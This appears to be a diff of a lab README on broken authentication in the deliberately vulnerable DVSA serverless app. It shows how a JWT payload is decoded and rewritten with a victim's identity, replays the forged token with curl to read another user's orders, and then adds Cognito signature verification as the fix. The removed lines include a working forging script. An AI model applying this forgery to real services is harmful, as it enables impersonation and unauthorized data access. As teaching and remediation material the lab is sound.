@@ -1,32 +1,50 @@
 # Lesson 2: Broken Authentication (JWT Forgery)
 
+## How to Use This Folder
+
+1. Read this README from top to bottom.
+2. Use the files in `payloads/` to copy clean request bodies and environment-variable templates.
+3. Use the scripts in `snippets/` to decode identities, demonstrate JWT payload modification, and document the secure fix.
+4. Compare your results with the screenshots in `evidence/`.
+5. Apply the fix in `DVSA-ORDER-MANAGER`, then repeat the verification step to confirm the forged token is rejected.
+
+> Do not commit real JWTs or live credentials. The screenshots in this folder are evidence from the lab, and token values are redacted where needed.
+
+---
+
 ## 1. Vulnerability Summary
 
 This lesson demonstrates a **Broken Authentication** vulnerability caused by improper validation of JSON Web Tokens (JWT) in the DVSA order system.
 
-The backend trusted identity claims such as `username` and `sub` from the JWT payload without verifying whether the token was genuinely issued by the trusted identity provider. Because of this, an attacker can modify the JWT payload, swap in another user's identity, and make the system treat them as that user.
+The backend trusted identity claims such as `username` and `sub` from the JWT payload without verifying whether the token was genuinely issued by the trusted identity provider. Because of this, an attacker could modify the JWT payload, replace their own identity with another user's identity, and make the backend treat them as the victim user.
 
-The impact is **user impersonation and unauthorized access to another user's private order data** — without ever knowing the victim's password.
+The impact is **user impersonation and unauthorized access to another user's private order data** without knowing the victim's password.
 
-The affected component is the `DVSA-ORDER-MANAGER` Lambda function (`order-manager.js`), which reads identity fields directly from the decoded JWT payload without verifying the token signature.
+The affected component is the `DVSA-ORDER-MANAGER` Lambda function (`order-manager.js`), which originally decoded JWT payload data and trusted it before verifying the token signature.
 
 ---
 
 ## 2. Root Cause
 
-A JWT has three parts: header, payload, and signature. The signature is the cryptographic proof that the token was issued by a trusted identity provider and has not been modified.
+A JWT has three parts:
+
+```text
+header.payload.signature
+```
+
+The payload is only Base64URL-encoded. It is not encrypted. Anyone who has a JWT can decode the payload, modify fields, and re-encode it. The part that makes the JWT trustworthy is the **signature**, because the signature proves that the token was issued by the trusted identity provider and has not been modified.
 
 The vulnerable application:
-- Decoded the JWT payload using base64
-- Trusted `username` and `sub` directly from the decoded payload
-- Never verified the signature against Cognito's public keys
 
-This means an attacker can:
-1. Decode any valid JWT payload
-2. Replace `username` and `sub` with the victim's identity
-3. Re-encode the payload
-4. Reuse the original signature (which no longer matches — but the backend never checks)
-5. Send the forged token and receive the victim's data
+- Decoded the JWT payload using Base64URL decoding
+- Trusted `username` and `sub` directly from the decoded payload
+- Did not verify the JWT signature against Cognito's public keys before using the claims
+
+### Why the attack works
+
+The attacker starts with a legitimate token from User B. They decode the payload, replace the identity fields with User C's `username` and `sub`, then reuse the original token header and signature. The signature no longer matches the modified payload, but the vulnerable backend does not check that. It reads the modified payload and fetches User C's orders.
+
+This breaks authentication because the server is trusting client-controlled identity data.
 
 ---
 
@@ -40,7 +58,7 @@ This means an attacker can:
 | Lambda Function | `DVSA-ORDER-MANAGER` |
 | File Modified | `order-manager.js` |
 | AWS Services | API Gateway, AWS Lambda, Amazon Cognito |
-| Tools Used | Browser DevTools (Chrome), Terminal (`curl`, `python3`, `jq`) |
+| Tools Used | Browser DevTools, Terminal, `curl`, `python3`, `jq` |
 
 ---
 
@@ -48,23 +66,26 @@ This means an attacker can:
 
 Before starting:
 
-1. Install the required tools
+1. Have access to the DVSA application.
+2. Create two normal non-admin accounts:
+   - User B: attacker account
+   - User C: victim account
+3. Make sure both users have at least one order.
+4. Install command-line tools.
 
-   On macOS:
-   ```bash
-   brew install curl jq python
-   ```
+On macOS:
 
-   On Linux:
-   ```bash
-   sudo apt-get install -y curl python3 jq
-   ```
+```bash
+brew install curl jq python
+```
 
-2. Have access to the DVSA application
-3. Create **two non-admin accounts**: User B (attacker) and User C (victim)
-4. Both users must have placed at least one order
+On Linux:
 
-**Evidence — tool installation:**
+```bash
+sudo apt-get install -y curl python3 jq
+```
+
+**Evidence — tool setup:**
 
 ![Step 1 - Tool Setup](evidence/step1_tool_setup.png)
 
@@ -74,25 +95,36 @@ Before starting:
 
 ### Step 1: Create Accounts and Place Orders
 
-1. Open DVSA in the browser
-2. Register **User B** (attacker account) and **User C** (victim account)
-3. Log in as each user and place at least one order
-4. You will need: `TOKEN_B`, `TOKEN_C`, and User C's order ID (`ORDER_C`)
+1. Open the DVSA website.
+2. Register and log in as User B.
+3. Place at least one order.
+4. Log out, then register and log in as User C.
+5. Place at least one order for User C.
+
+You will need:
+
+- `TOKEN_B` — User B's JWT
+- `TOKEN_C` — User C's JWT
+- `ORDER_C` — User C's order ID
 
 ---
 
-### Step 2: Capture Tokens from Browser DevTools
+### Step 2: Capture the API URL and Tokens
 
-Log in as **User B** and open the Orders page.
+1. Log in as User B.
+2. Open Browser DevTools → **Network**.
+3. Open the Orders page.
+4. Click the `/order` request.
+5. Copy the request URL and the `Authorization` header.
+6. Repeat the same process for User C.
 
-1. Open DevTools (`F12`) → **Network** tab → filter by `order`
-2. Click the `/order` request
-3. Go to **Headers** → **Request Headers**
-4. Copy the full `Authorization` header value → save as `TOKEN_B`
-5. Copy the **Request URL** → save as `API`
-6. Repeat the same process logged in as **User C** → save as `TOKEN_C`
+Export the values in your terminal:
 
-Then export these as environment variables in your terminal:
+```bash
+source payloads/environment_variables_template.sh
+```
+
+Then edit the placeholders in your terminal session or paste them manually:
 
 ```bash
 export API="https://d0xsecb8a2.execute-api.us-east-1.amazonaws.com/dvsa/order"
@@ -100,7 +132,7 @@ export TOKEN_B="<paste User B JWT here>"
 export TOKEN_C="<paste User C JWT here>"
 ```
 
-**Evidence — API Request URL:**
+**Evidence — API request URL:**
 
 ![Step 2 - Request URL](evidence/step2_request_url.png)
 
@@ -112,96 +144,65 @@ export TOKEN_C="<paste User C JWT here>"
 
 ![Step 2 - Token C Authorization Header](evidence/step2_token_c.png)
 
-Now decode both tokens to extract the identity fields. Run this in your terminal:
+Decode both JWT payloads to identify User C's identity fields:
 
 ```bash
-python3 - <<'PY'
-import os, json, base64
-
-def decode(token):
-    payload = token.split(".")[1]
-    payload += "=" * (-len(payload) % 4)
-    return json.loads(base64.urlsafe_b64decode(payload.encode()))
-
-for name in ["TOKEN_B","TOKEN_C"]:
-    data = decode(os.environ[name])
-    print("\n" + name)
-    print("username:", data.get("username"))
-    print("sub     :", data.get("sub"))
-PY
+python3 snippets/decode_jwt_identities.py
 ```
 
-Copy User C's `username` and `sub` values and export them:
+Copy User C's identity value and export it:
 
 ```bash
 export VICTIM_USER="<User C username/sub value>"
 ```
 
-**Evidence — decoded identity fields for both users:**
+**Evidence — decoded identity values:**
 
 ![Step 2 - Decoded Token Identities](evidence/step2_decode_identities.png)
 
 ---
 
-### Step 3: Confirm Normal Behavior (Baseline)
+### Step 3: Confirm Normal Behavior
 
-Using User B's original token, confirm that the API only returns User B's own orders:
+Use User B's original token to confirm that User B only sees their own orders:
 
 ```bash
 curl -s "$API" \
   -H "content-type: application/json" \
   -H "authorization: $TOKEN_B" \
-  --data-raw '{"action":"orders"}' | jq
+  --data-raw @payloads/orders_request.json | jq
 ```
 
-**Expected result:** Only User B's orders are returned. User C's data is not visible.
+**Expected result:** the API returns User B's orders only.
 
-**Evidence — User B's orders with legitimate token:**
+**Evidence — User B orders with legitimate token:**
 
-![Step 3 - User B Orders (Normal Behavior)](evidence/step3_user_b_orders.png)
+![Step 3 - User B Orders](evidence/step3_user_b_orders.png)
 
 ---
 
-### Step 4: Forge the JWT Token
+### Step 4: Forge the JWT Payload
 
-This step takes TOKEN_B's header and signature, replaces the payload with User C's identity, and re-encodes the token.
-
-Run in your terminal:
+Generate a modified token that keeps User B's header and signature but changes the payload identity fields to User C:
 
 ```bash
-export FAKE_AS_C="$(
-python3 - <<'PY'
-import os, json, base64
-
-t = os.environ["TOKEN_B"]
-victim = os.environ["VICTIM_USER"]
-
-h,p,s = t.split(".")
-p += "=" * (-len(p) % 4)
-data = json.loads(base64.urlsafe_b64decode(p.encode()))
-
-data["username"] = victim
-data["sub"] = victim
-
-newp = base64.urlsafe_b64encode(
-    json.dumps(data, separators=(",",":")).encode()
-).rstrip(b"=").decode()
-
-print(f"{h}.{newp}.{s}")
-PY
-)"
+export FAKE_AS_C="$(python3 snippets/forge_jwt_payload.py)"
 echo "Forged token length: ${#FAKE_AS_C}"
 ```
 
-The script is also available as [`broken_auth_test.py`](broken_auth_test.py) for reference and documentation.
+A standalone helper version is also provided:
 
-**Evidence — forged token generated successfully:**
+```bash
+python3 broken_auth_test.py
+```
+
+**Evidence — forged token generated:**
 
 ![Step 4 - JWT Token Forging](evidence/step4_forge_token.png)
 
 ---
 
-### Step 5: Use the Forged Token to Access Victim's Orders
+### Step 5: Use the Forged Token to Access Victim Orders
 
 Send the forged token to the Orders API:
 
@@ -209,25 +210,30 @@ Send the forged token to the Orders API:
 curl -s "$API" \
   -H "content-type: application/json" \
   -H "authorization: $FAKE_AS_C" \
-  --data-raw '{"action":"orders"}' | jq
+  --data-raw @payloads/orders_request.json | jq
 ```
 
-**Expected result:** The API returns **User C's** private order list — not User B's.
+**Expected vulnerable result:** the API returns User C's private orders even though the attacker started from User B's token.
 
-Returned victim order details:
-- `order-id`: `de2c6970-56fc-4b61-8cc5-ef2faf5f4060`
-- `total`: `44`
-- `status`: `delivered`
+Returned victim order evidence:
 
-This proves the backend accepted the forged token and returned protected data without any signature validation.
+```text
+order-id: de2c6970-56fc-4b61-8cc5-ef2faf5f4060
+total:    44
+status:   delivered
+```
+
+Export the victim order ID for the next test:
 
 ```bash
 export ORDER_C="de2c6970-56fc-4b61-8cc5-ef2faf5f4060"
 ```
 
-**Evidence — User C's orders returned using forged token:**
+**Evidence — victim orders returned using forged token:**
 
 ![Step 5 - Victim Orders Returned](evidence/step5_victim_orders_returned.png)
+
+**Evidence — victim order confirmed:**
 
 ![Step 5 - Victim Orders Confirmed](evidence/step5_victim_orders_confirmed.png)
 
@@ -235,7 +241,7 @@ export ORDER_C="de2c6970-56fc-4b61-8cc5-ef2faf5f4060"
 
 ### Step 6: Attempt Full Order Detail Retrieval
 
-Try to retrieve the full details of User C's order using the forged token:
+The forged token can also be used to attempt access to detailed order data:
 
 ```bash
 curl -i "$API" \
@@ -244,17 +250,17 @@ curl -i "$API" \
   --data-raw "{\"action\":\"get\",\"order-id\":\"$ORDER_C\",\"isAdmin\":\"false\"}"
 ```
 
-**Result:** The API returns an internal server error:
+The application returned a backend error related to `isAdmin` type handling:
 
-```
+```text
 AttributeError: 'bool' object has no attribute 'lower'
 ```
 
-This is a backend bug in how the Lambda handles the `isAdmin` field — not a fix. The exploit was already fully proven in Step 5. This step shows the attacker attempted further escalation.
+This error does not fix the authentication issue. The authentication bypass was already proven when the forged token returned User C's order list.
 
-**Evidence — backend error during order detail retrieval:**
+**Evidence — backend error during full order retrieval:**
 
-![Step 6 - Backend Error During Full Order Retrieval](evidence/step6_backend_error.png)
+![Step 6 - Backend Error](evidence/step6_backend_error.png)
 
 ---
 
@@ -262,23 +268,23 @@ This is a backend bug in how the Lambda handles the `isAdmin` field — not a fi
 
 | What was attempted | Result |
 |---|---|
-| Access User B's own orders with TOKEN_B | Succeeded (expected behavior) |
-| Forge TOKEN_B payload with User C's identity | Succeeded — token accepted by backend |
-| Retrieve User C's private order list | Succeeded — victim data returned |
-| Retrieve full order details with forged token | Partial — backend bug blocked further access |
+| Use User B's original JWT | Succeeded — User B orders returned |
+| Modify JWT payload identity fields | Succeeded |
+| Use forged token to access User C orders | Succeeded — victim orders returned |
+| Retrieve full victim order details | Partial — blocked by separate backend type-handling error |
 
-The core vulnerability is confirmed: the backend accepted a tampered JWT and returned another user's private data.
+The core issue is confirmed: the backend accepted a tampered JWT and trusted the modified identity claims.
 
 ---
 
 ## 7. Fix Strategy
 
-The fix must be applied inside `DVSA-ORDER-MANAGER` (`order-manager.js`):
+The fix must be applied inside `DVSA-ORDER-MANAGER` in `order-manager.js`:
 
-- **Verify JWT signature** using Cognito's JWKS public keys before trusting any claims
-- **Validate required claims** such as `iss`, `exp`, `aud`, and `token_use`
-- **Reject tampered, expired, or unverifiable tokens** with HTTP 401
-- **Never use decoded JWT payload fields** for authorization decisions without prior signature verification
+- Verify the JWT signature using Cognito's JWKS public keys before trusting claims.
+- Validate required claims such as `iss`, `exp`, and `token_use`.
+- Reject tampered, expired, malformed, or unverifiable tokens with HTTP `401`.
+- Never use `username`, `sub`, or other JWT fields for authorization before verification succeeds.
 
 ---
 
@@ -286,66 +292,67 @@ The fix must be applied inside `DVSA-ORDER-MANAGER` (`order-manager.js`):
 
 **Location:** `DVSA-ORDER-MANAGER` → `order-manager.js`
 
-### What was added
+### Before: vulnerable JWT handling
 
-Three JWT verification helper functions were added to `order-manager.js`:
-
-- `fetchJson(url)` — fetches the Cognito JWKS public key endpoint
-- `getCognitoKeystore()` — fetches and caches Cognito's public keys
-- `verifyCognitoJwt(jwt)` — verifies the token signature and validates claims (`iss`, `exp`, `token_use`)
-
-**Evidence — JWT verification helper functions added:**
-
-![Fix - JWT Helper Functions](evidence/fix_jwt_helper_functions.png)
-
-### How the authentication flow changed
-
-**Before (vulnerable):**
 ```javascript
 // Split token manually, base64 decode payload, trust claims directly
 var token_sections = auth_header.split('.');
 var auth_data = jose.util.base64url.decode(token_sections[1]);
 var token = JSON.parse(auth_data);
-var user = token.username;  // trusted without verification
+var user = token.username;
 ```
 
-**After (secure):**
+Snippet file:
+
+```text
+snippets/vulnerable_jwt_decode_snippet.js
+```
+
+### After: secure JWT verification
+
+The fix adds helper functions to fetch Cognito public keys, verify the JWT signature, and validate claims before reading the user identity.
+
+Snippet file:
+
+```text
+snippets/jwt_verification_fix_snippet.js
+```
+
+**Evidence — JWT helper functions added:**
+
+![Fix - JWT Helper Functions](evidence/fix_jwt_helper_functions.png)
+
+After verification succeeds, the backend reads identity from verified claims only:
+
 ```javascript
-// Verify signature using Cognito public keys, then use verified claims
 verifyCognitoJwt(jwt).then((claims) => {
     var user = claims.username || claims["cognito:username"] || claims.sub;
-    // ... rest of handler only runs if verification passed
+    // Continue normal processing only after verification succeeds.
 }).catch((e) => {
     console.log("JWT verify failed:", e);
     return callback(null, resp(401, { status: "err", msg: "invalid token" }));
 });
 ```
 
-**Evidence — secure claims validation after verification:**
+**Evidence — verified claims handling:**
 
 ![Fix - JWT Claims Validation](evidence/fix_jwt_claims_validation.png)
 
-**Evidence — invalid token response on verification failure:**
+**Evidence — invalid token response path:**
 
 ![Fix - Invalid Token Response Code](evidence/fix_invalid_token_response.png)
-
-If verification fails for any reason (tampered payload, wrong signature, expired token), the system returns:
-
-```json
-{"status": "err", "msg": "invalid token"}
-```
 
 ---
 
 ## 9. Verification After Fix
 
-Send the same forged token again after deploying the fix:
+Repeat the same request with the forged token:
 
 ```bash
 curl -s "$API" \
   -H "content-type: application/json" \
   -H "authorization: $FAKE_AS_C" \
-  --data-raw '{"action":"orders"}' | jq
+  --data-raw @payloads/orders_request.json | jq
 ```
 
 **Expected result after fix:**
@@ -357,13 +364,11 @@ curl -s "$API" \
 }
 ```
 
-The forged token is rejected because the signature no longer matches the modified payload. User C's orders are not returned.
-
 **Evidence — forged token rejected after fix:**
 
 ![Step 8 - Post-Fix Invalid Token Response](evidence/step8_post_fix_invalid_token.png)
 
-**What changed:** Before the fix, the backend read `username` directly from the decoded payload. After the fix, it calls `verifyCognitoJwt()` first. Since the forged token has a mismatched signature, verification fails and the request is rejected before any data is returned.
+**What changed:** before the fix, the backend trusted decoded payload claims directly. After the fix, `verifyCognitoJwt()` verifies the signature first. Since the forged token has a modified payload and mismatched signature, verification fails and the request is rejected before any user data is returned.
 
 ---
 
@@ -371,68 +376,76 @@ The forged token is rejected because the signature no longer matches the modifie
 
 ### Intended Logic
 
-Under normal conditions, a user logs in through Cognito, receives a signed JWT, and uses it to access their own orders. The expected flow:
+The intended authentication flow is:
 
+```text
+Browser → Cognito login → signed JWT issued
+Browser → API Gateway → Lambda verifies JWT → DynamoDB returns only that user's orders
 ```
-Browser → Cognito (login) → JWT issued with signature
-User → API Gateway → Lambda (verify JWT signature) → DynamoDB (fetch user's orders)
-```
 
-**Security rules the system must enforce:**
-- JWT signature must be verified against Cognito's public keys before trusting any claims
-- User identity must never be determined from an unverified, client-controlled payload
-- A token with a mismatched signature must be rejected immediately
+Security rules:
 
----
+- JWT signature must be verified before claims are trusted.
+- User identity must not come from an unverified client-controlled payload.
+- A token with a mismatched signature must be rejected immediately.
+- Each user should only access their own order data.
 
 ### Table 1 — Intended vs. Observed Behavior
 
 | Vulnerability | Intended Rule(s) | Artifacts Used | Normal Behavior Evidence | Exploit Behavior Evidence |
 |---|---|---|---|---|
-| Broken Authentication (JWT Forgery) | Only a valid, cryptographically verified JWT should determine user identity. User B must only access their own orders. | Browser DevTools (captured tokens), terminal `curl` output, decoded JWT payloads, forged token response, `order-manager.js` source code | Using TOKEN_B, the API returned only User B's own orders — proving correct access control under normal conditions (`step3_user_b_orders.png`) | After modifying the JWT payload and reusing the original signature, the forged token returned User C's private order list — proving the backend trusted the payload without signature verification (`step5_victim_orders_returned.png`) |
-
----
+| Broken Authentication (JWT Forgery) | Only a valid, cryptographically verified JWT should determine user identity. User B must only access User B's orders. | Browser DevTools, captured JWTs, terminal output, forged token, Lambda source code screenshots | User B's valid token returned only User B's own orders (`step3_user_b_orders.png`) | Forged token returned User C's private order list (`step5_victim_orders_returned.png`) |
 
 ### Table 2 — Deviation Analysis and Fix
 
 | Vulnerability | Why This Is a Deviation | Deviation Class | Fix Applied | Post-Fix Verification | Latency |
 |---|---|---|---|---|---|
-| Broken Authentication (JWT Forgery) | The backend trusted identity claims (`username`, `sub`) from the JWT payload without verifying the token signature. This violated the intended rule because attacker-controlled claims were used for authorization decisions, enabling impersonation of any user whose identity the attacker could discover. | Intentional Misuse / Security-Relevant Abuse | JWT signature verification (`verifyCognitoJwt()`) added to `order-manager.js` using Cognito JWKS public keys. All claim validation happens before `username` or `sub` is trusted. | Forged token returns `{"status":"err","msg":"invalid token"}`. Victim data no longer accessible. Legitimate tokens still work normally. (`step8_post_fix_invalid_token.png`) | ~120 ms / ~128 ms |
+| Broken Authentication (JWT Forgery) | The backend trusted attacker-controlled JWT payload claims without verifying the token signature. This allowed impersonation by modifying `username` and `sub`. | Intentional Misuse / Security-Relevant Abuse | Added `verifyCognitoJwt()` in `order-manager.js` using Cognito JWKS public keys. Claims are trusted only after signature verification succeeds. | Forged token returns `{"status":"err","msg":"invalid token"}` and victim data is no longer returned (`step8_post_fix_invalid_token.png`) | ~120 ms / ~128 ms |
 
 ---
 
 ## 11. Lessons Learned
 
-JWT payloads are base64-encoded, not encrypted — anyone can decode and modify them. The only thing that makes a JWT trustworthy is its cryptographic signature.
+JWT payloads are not secret. They are easy to decode and modify because they are only Base64URL-encoded. The signature is what protects the token from tampering.
 
-When the backend skips signature verification and reads identity fields directly from the payload, it is effectively trusting the user to tell it who they are. This is the same as having no authentication at all for any attacker who holds a valid token.
+The mistake in this lesson was treating decoded JWT claims as trusted identity. That allowed an attacker to choose who they wanted to be by editing the token payload.
 
-In serverless environments this is especially dangerous because a single Lambda function often controls access to all of a user's data. Compromising authentication at the API layer means every piece of that user's data — orders, receipts, billing records — becomes accessible.
+Authentication must be verified cryptographically on the server side. In this case, the Lambda should verify the JWT against Cognito's public keys before reading `username`, `sub`, or any other identity claim.
 
-The correct principle is simple: **never trust a JWT claim until the signature has been verified**. Once `verifyCognitoJwt()` is in place, the system moves from trusting attacker-controlled input to trusting cryptographically verified server-side identity, and token forgery becomes impossible.
+The main lesson is: **never trust JWT claims until the token signature has been verified**.
 
 ---
 
 ## Repository Structure
 
-```
-lesson2_broken_auth/
+```text
+lesson2_broken_authentication/
 │
-├── README.md                          <- This file
-├── broken_auth_test.py                <- Python script to decode and forge JWT (reference/documentation)
-└── evidence/
-    ├── step1_tool_setup.png           <- Tool installation (brew install curl jq python)
-    ├── step2_request_url.png          <- API endpoint captured from DevTools
-    ├── step2_token_b.png              <- TOKEN_B Authorization header from DevTools
-    ├── step2_token_c.png              <- TOKEN_C Authorization header from DevTools
-    ├── step2_decode_identities.png    <- Decoded username/sub for both users
-    ├── step3_user_b_orders.png        <- Normal behavior: User B sees only own orders
-    ├── step4_forge_token.png          <- Forged token generated successfully
-    ├── step5_victim_orders_returned.png  <- Forged token returns User C's orders
-    ├── step5_victim_orders_confirmed.png <- Same result confirmed again
-    ├── step6_backend_error.png        <- Backend error during full order detail attempt
-    ├── fix_jwt_helper_functions.png   <- Code: JWT verification helper functions added
-    ├── fix_jwt_claims_validation.png  <- Code: verifyCognitoJwt() claim validation
-    ├── fix_invalid_token_response.png <- Code: catch block returning invalid token
-    └── step8_post_fix_invalid_token.png  <- Post-fix: forged token rejected with invalid token
+├── README.md
+├── broken_auth_test.py
+├── evidence/
+│   ├── step1_tool_setup.png
+│   ├── step2_request_url.png
+│   ├── step2_token_b.png
+│   ├── step2_token_c.png
+│   ├── step2_decode_identities.png
+│   ├── step3_user_b_orders.png
+│   ├── step4_forge_token.png
+│   ├── step5_victim_orders_returned.png
+│   ├── step5_victim_orders_confirmed.png
+│   ├── step6_backend_error.png
+│   ├── fix_jwt_helper_functions.png
+│   ├── fix_jwt_claims_validation.png
+│   ├── fix_invalid_token_response.png
+│   └── step8_post_fix_invalid_token.png
+├── payloads/
+│   ├── orders_request.json
+│   ├── get_order_request_template.json
+│   └── environment_variables_template.sh
+└── snippets/
+    ├── decode_jwt_identities.py
+    ├── forge_jwt_payload.py
+    ├── vulnerable_jwt_decode_snippet.js
+    ├── jwt_verification_fix_snippet.js
+    └── invalid_token_response_snippet.js
 ```
